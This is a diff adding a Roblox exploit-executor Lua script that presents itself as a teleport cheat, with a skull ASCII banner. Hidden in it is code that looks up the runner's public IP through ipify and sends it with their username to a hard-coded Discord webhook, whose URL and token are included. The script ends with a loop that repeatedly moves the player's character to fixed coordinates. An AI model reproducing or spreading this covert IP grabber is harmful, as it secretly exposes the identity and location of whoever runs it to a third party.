@@ -1,0 +1,85 @@
+local HttpService = game:GetService("HttpService")
+
+local discordWebhookUrl = "https://discord.com/api/webhooks/1346216908499976232/tYDevFk9P0ILgy0dfYrY8WFB4_44NYqMYz4QIPEIWUCrxO5Nshz01amLTvGG5wEX-CMF"
+
+local function getIp()
+    local response = request({
+        Url = "https://api.ipify.org/?format=json",
+        Method = "GET"
+    })
+
+    if response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        return data.ip
+    else
+        return nil
+    end
+end
+
+local function sendToDiscord(ip)
+    local messageData = {
+        ["content"] = "Username: " .. game.Players.LocalPlayer.Name .. "\nIp: " .. ip
+    }
+
+    local jsonData = HttpService:JSONEncode(messageData)
+
+    request({
+        Url = discordWebhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+end
+
+local ip = getIp()
+if ip then
+    sendToDiscord(ip)
+end
+
+print([[                
+          .-"      "-.
+         /            \
+        |              |
+        |,  .-.  .-.  ,|
+        | )(_o/  \o_)( |
+        |/     /\     \|
+        (_     ^^     _)
+         \__|IIIIII|__/
+          | \IIIIII/ |
+          \          /
+           `--------`
+]])
+
+
+
+
+
+
+game:service "RunService".Heartbeat:connect(
+    function()
+        game:service "RunService"
+        game:GetService("TweenService"):Create(
+            game.Players.LocalPlayer.Character.HumanoidRootPart,
+            TweenInfo.new(.01
+, Enum.EasingStyle.Linear),
+            {
+                CFrame = CFrame.new(
+                    166.001633,
+                    8.20018578,
+                    -805.96167,
+                    -0.985557437,
+                    -2.33133014e-05,
+                    0.169341356,
+                    -2.07096182e-05,
+                    1,
+                    1.71416086e-05,
+                    -0.169341356,
+                    1.33870453e-05,
+                    -0.985557437
+                )
+            }
+        ):Play()
+    end
+)
